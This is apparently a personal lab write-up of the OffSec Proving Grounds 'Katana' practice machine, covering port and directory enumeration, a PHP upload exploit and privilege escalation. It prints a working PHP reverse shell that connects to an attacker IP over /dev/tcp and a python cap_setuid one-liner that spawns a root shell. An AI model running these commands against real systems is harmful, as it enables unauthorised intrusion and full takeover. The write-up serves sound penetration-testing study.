---
title: OffSec PG - Katana
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.51.83`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.51.83`

OS Detection &rarr;  `OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                     |
| -------- | ----------- | ---------------------------------------------- |
| 21       | FTP         | vsftpd 3.0.3                                   |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                 |
| 7080     | HTTPS       | Litespeed httpd                                |
| 8088     | HTTP        | Litespeed httpd                                |
| 8715     | HTTP        | nginx 1.14.2                                   |

Therefore, a bunch of ports are open for http &rarr; 80, 7080, 8088, 8715, ftp on port 21 and ssh on port 22.

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.51.83 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

The result for the port 7080 revealed nothing. The scan for port 80 resulted in the following finds &rarr;

- ebook/ (301)
- server-status (403)

Directories/files listed for port 8088 &rarr;

- index.html
- cgi-bin/ (301)
- img/ (301)
- docs/ (301)
- upload.html
- upload.php
- css/ (301)
- protected/ (301)
- blocked/ (301)
- phpinfo.php

The scan for the port 8715 revealed nothing.

---

## Exploitation

Looking at the status codes `200` for the enumeration of port 8088, there are two files `upload.html` and `upload.php`. These are connected and are an upload capability. Uploading a file on the port 8088 website allows for the file to be accessed on a different web server. This web server is that running on port 8715. However, after testing txt and php files, php files are accessible while txt files need a password. Therefore, a php file can be used to create a reverse shell. Used the following php payload for the reverse shell &rarr;

```php
<?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.187/3002 0>&1'");
?>
```

A good resource for a reverse shell is [Pentest Monkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

---

## Privilege Escalation

The reverse shell, therefore is the `www-data` user on the machine. This gives the user flag. Checked sudo capabilities for the user, but there were none. Search for setuid binaries did not give any results as well.

The next checks are to be made for capabilities. Used `getcap -r / 2>/dev/null` to list files with capabilities set. The result includes the entry &rarr; `/usr/bin/python2.7 = cap_setuid+ep`.

Therefore, the following python code can be invoked using the said binary to elevate privileges &rarr; `/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'`. This gives the root flag.

---
